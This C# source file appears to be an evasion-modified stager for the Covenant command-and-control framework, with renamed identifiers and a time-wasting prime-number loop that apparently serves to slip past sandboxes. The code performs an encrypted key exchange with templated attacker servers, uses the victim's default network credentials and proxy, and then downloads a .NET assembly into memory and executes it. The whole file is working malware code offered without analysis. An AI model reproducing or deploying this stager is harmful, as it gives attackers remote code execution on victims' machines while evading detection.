using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace echoCovStg
{
    public class EchoStg
    {
        public EchoStg()
        {
            DoStg();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new EchoStg();
        }
        public static void Execute()
        {
            new EchoStg();
        }
        public class PrimeChecker
        {
            public static void PerformPrimeCheck()
            {
                int maxNumber = 33567765;
                int primes = 0;

                for (int i = 2; i <= maxNumber; i++)
                {
                    bool isPrime = true;
                    double sqrt = Math.Sqrt(i);

                    for (int j = 2; j <= sqrt; j++)
                    {
                        if (i % j == 0)
                        {
                            isPrime = false;
                            break;
                        }
                    }

                    if (isPrime)
                    {
                        primes++;
                    }
                }

                return;
            }
        }
        public static class MaStrings
        {
            public static readonly List<string> EchoURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
            public const string EchoCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
            public static readonly List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
            public static readonly List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
            public static readonly List<string> EchoHTTPURLs = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
            public static readonly string EchoPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
            public static readonly string EchoPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
            public static readonly bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
            public static readonly bool UseCPin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
        }
        public void DoStg()
        {
            PrimeChecker.PerformPrimeCheck();
            try
            {
                Random random = new Random();
                EchoWeCli MyWeC = null;

                string aGlobID = @"{{REPLACE_GRUNT_GUID}}";
                string MyGlobID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetKBs = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
                string MessForm = @"{{""MyGlobID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

                Aes SetAesK = Aes.Create();
                SetAesK.Mode = CipherMode.CBC;
                SetAesK.Padding = PaddingMode.PKCS7;
                SetAesK.Key = SetKBs;
                SetAesK.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetKBs);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPKBs = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncRSAPK = SetAesK.CreateEncryptor().TransformFinalBlock(RSAPKBs, 0, RSAPKBs.Length);
                byte[] hash = hmac.ComputeHash(EncRSAPK);
                string StgOBod = String.Format(MessForm, aGlobID + MyGlobID, "0", "", Convert.ToBase64String(SetAesK.IV), Convert.ToBase64String(EncRSAPK), Convert.ToBase64String(hash));

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | SecurityProtocolType.Ssl3; } catch { }
                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)768; } catch { }
                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)3072; } catch { }
                try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)12288; } catch { }

                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                {
                    bool valid = true;
                    if (MaStrings.UseCPin && MaStrings.EchoCertHash != "")
                    {
                        valid = cert.GetCertHashString() == MaStrings.EchoCertHash;
                    }
                    if (valid && MaStrings.ValCert)
                    {
                        valid = errors == System.Net.Security.SslPolicyErrors.None;
                    }
                    return valid;
                };
                string ChangedResp = MessageTransform.Transform(Encoding.UTF8.GetBytes(StgOBod));
                
                string StgOResp = "";
                MyWeC = new EchoWeCli();
                MyWeC.UseDefaultCredentials = true;
                string EchoURI = "";
                MyWeC.Proxy = WebRequest.DefaultWebProxy;
                MyWeC.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                
                foreach (string MyURL in MaStrings.EchoURIs)
                {
                    try
                    {
                        for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
                        {
                            if (MaStrings.EchoHeaderNames[i] == "Cookie")
                            {
                                MyWeC.SetCookies(new Uri(MyURL), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", ""));
                            }
                            else
                            {
                                MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", ""), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", ""));
                            }
                        }
                        MyWeC.DownloadString(MyURL + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", ""));
                        EchoURI = MyURL;
                    }
                    catch
                    {
                        continue;
                    }
                }
                for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
                {
                    if (MaStrings.EchoHeaderNames[i] == "Cookie")
                    {
                        MyWeC.SetCookies(new Uri(EchoURI), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", MyGlobID));
                    }
                    else
                    {
                        MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
                    }
                }
                StgOResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(MaStrings.EchoPOSTReq, ChangedResp));
                string pulled = Parse(StgOResp, MaStrings.EchoPOSTResp)[0];
                pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                List<string> gotten = Parse(pulled, MessForm);
                string My64IV = gotten[3];
                string My64mess = gotten[4];
                string My64Has = gotten[5];
                byte[] messBy = Convert.FromBase64String(My64mess);
                if (My64Has != Convert.ToBase64String(hmac.ComputeHash(messBy))) { return; }
                SetAesK.IV = Convert.FromBase64String(My64IV);
                byte[] PDC = SetAesK.CreateDecryptor().TransformFinalBlock(messBy, 0, messBy.Length);
                byte[] FDC = rsa.Decrypt(PDC, true);

                Aes MySesK = Aes.Create();
                MySesK.Mode = CipherMode.CBC;
                MySesK.Padding = PaddingMode.PKCS7;
                MySesK.Key = FDC;
                MySesK.GenerateIV();
                hmac = new HMACSHA256(MySesK.Key);
                byte[] ChalI = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(ChalI);
                byte[] EncChalI = MySesK.CreateEncryptor().TransformFinalBlock(ChalI, 0, ChalI.Length);
                hash = hmac.ComputeHash(EncChalI);

                string StgIBod = String.Format(MessForm, MyGlobID, "1", "", Convert.ToBase64String(MySesK.IV), Convert.ToBase64String(EncChalI), Convert.ToBase64String(hash));
                ChangedResp = MessageTransform.Transform(Encoding.UTF8.GetBytes(StgIBod));

                string StgIResp = "";
                for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
                {
                    if (MaStrings.EchoHeaderNames[i] == "Cookie")
                    {
                        MyWeC.SetCookies(new Uri(EchoURI), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", MyGlobID));
                    }
                    else
                    {
                        MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
                    }
                }
                StgIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(MaStrings.EchoPOSTReq, ChangedResp));
                pulled = Parse(StgIResp, MaStrings.EchoPOSTResp)[0];
                pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                gotten = Parse(pulled, MessForm);
                My64IV = gotten[3];
                My64mess = gotten[4];
                My64Has = gotten[5];
                messBy = Convert.FromBase64String(My64mess);
                if (My64Has != Convert.ToBase64String(hmac.ComputeHash(messBy))) { return; }
                MySesK.IV = Convert.FromBase64String(My64IV);

                byte[] DChal = MySesK.CreateDecryptor().TransformFinalBlock(messBy, 0, messBy.Length);
                byte[] ChalITst = new byte[4];
                byte[] ChalII = new byte[4];
                Buffer.BlockCopy(DChal, 0, ChalITst, 0, 4);
                Buffer.BlockCopy(DChal, 4, ChalII, 0, 4);
                if (Convert.ToBase64String(ChalI) != Convert.ToBase64String(ChalITst)) { return; }

                MySesK.GenerateIV();
                byte[] EncChalII = MySesK.CreateEncryptor().TransformFinalBlock(ChalII, 0, ChalII.Length);
                hash = hmac.ComputeHash(EncChalII);

                string StgIIBod = String.Format(MessForm, MyGlobID, "2", "", Convert.ToBase64String(MySesK.IV), Convert.ToBase64String(EncChalII), Convert.ToBase64String(hash));
                ChangedResp = MessageTransform.Transform(Encoding.UTF8.GetBytes(StgIIBod));

                string StgIIResp = "";
                for (int i = 0; i < MaStrings.EchoHeaderVals.Count; i++)
                {
                    if (MaStrings.EchoHeaderNames[i] == "Cookie")
                    {
                        MyWeC.SetCookies(new Uri(EchoURI), MaStrings.EchoHeaderVals[i].Replace(";", ",").Replace("{MyGlobID}", MyGlobID));
                    }
                    else
                    {
                        MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
                    }
                }
                StgIIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(MaStrings.EchoPOSTReq, ChangedResp));
                pulled = Parse(StgIIResp, MaStrings.EchoPOSTResp)[0];
                pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                gotten = Parse(pulled, MessForm);
                My64IV = gotten[3];
                My64mess = gotten[4];
                My64Has = gotten[5];
                messBy = Convert.FromBase64String(My64mess);
                if (My64Has != Convert.ToBase64String(hmac.ComputeHash(messBy))) { return; }
                MySesK.IV = Convert.FromBase64String(My64IV);
                byte[] DCA = MySesK.CreateDecryptor().TransformFinalBlock(messBy, 0, messBy.Length);
                Assembly EchoAss = Assembly.Load(DCA);
                EchoAss.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { EchoURI, MaStrings.EchoCertHash, MyGlobID, MySesK });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
        }

        public class EchoWeCli : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public EchoWeCli()
            {
                this.CookieContainer = new CookieContainer();
            }
            public void SetCookies(Uri uri, string cookies)
            {
                this.CookieContainer.SetCookies(uri, cookies);
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address) as HttpWebRequest;
                if (request == null) return base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}